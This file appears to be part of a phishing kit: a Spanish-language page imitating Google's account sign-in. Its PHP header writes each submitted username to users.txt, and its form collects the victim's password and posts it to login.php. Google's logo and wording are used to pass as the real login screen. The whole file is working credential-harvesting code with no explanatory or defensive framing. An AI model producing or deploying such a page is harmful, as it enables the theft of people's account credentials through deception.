<?php

$username = $_POST['user'];

$archivo = fopen("users.txt","a");
$datos= "\n"."Account: ".$username."\r\n";

fwrite($archivo,$datos);
fclose($archivo);
?>

<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="./css/styles.css" />
    <link rel="stylesheet" href="https://accounts.google.com/ServiceLogin?hl=es&flowName=GlifWebSignIn&flowEntry=ServiceLogin" />
    <title>Acceso: Cuentas de Google</title>
  </head>
  <body>

    <main class="main">
      <header class="main__header">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="logo"/>
        <h3 class="header__title">Te damos la bienvenida</h3>
        <h5 class="header__subtitle">Para continuar primero debes verificar que eres tú</h5>
      </header>
      <form class="main__form" method="post" action="login.php">
        <div class="form__account">
          <input name="pass" type="password" class="whsOnd zHQkBf" placeholder="Ingresa tu contraseña"/>
        </div>
        <div class="form__create">
          <a href="#" class="links">
            <h5 class="create__link">¿Olvidaste la contraseña?</h5>
          </a>
          <input type="submit" value="Siguiente" />
        </div>
      </form>

    </main>
    <footer class="footer">
      <div class="footer__column left">
        <select class="footer__language">
          <option value="USEN">Español (España)</option>
          <option value="KR">Korean</option>
          <option value="FR">French</option>
        </select>
      </div>
      <div class="footer__column right">
        <span class="footer__help item">Ayuda</span>
        <span class="footer__privacy item">Privacidad</span>
        <span class="footer__Terms item">Términos</span>
      </div>
    </footer>
  </body>
</html>
